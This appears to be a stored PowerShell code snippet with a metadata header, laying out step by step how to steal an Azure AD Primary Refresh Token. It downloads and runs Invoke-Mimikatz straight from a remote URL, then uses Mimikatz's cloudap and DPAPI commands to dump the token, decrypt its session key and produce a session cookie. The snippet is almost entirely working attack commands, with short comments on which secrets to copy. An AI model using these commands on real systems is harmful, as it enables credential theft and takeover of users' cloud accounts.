---
id: 3c2058ad-f078-4711-a5c7-d1496d766be6
type: code
language: Powershell
verified: false
created_at: '2023-05-25T17:05:31.668680+00:00'
updated_at: '2023-05-25T17:06:17.905147+00:00'
---

# Code Snippet 3c2058ad

**Language**: Powershell

```powershell
# Run mimikatz to obtain the PRT
PS> iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
PS> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'

# Copy the PRT and KeyValue
Mimikatz> privilege::debug


# Display the PRT data and copy the PRT key and the ProofOfPosessionKey.KeyValue
Mimikatz> sekurlsa::cloudap

# Decrypt the session key (use the ProofOfPossesionKey keyvalue here); Copy the Context value and Derived key value
Mimikatz> token::elevate
Mimikatz> dpapi::cloudapkd /keyvalue:<KeyValue> /unprotect

# Use the PRT Key, Context and Derived key copied earlier; Copy the Signature with key token "ey...", this is the PRT session cookie
Mimikatz> dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /Prt:<PRT>

```


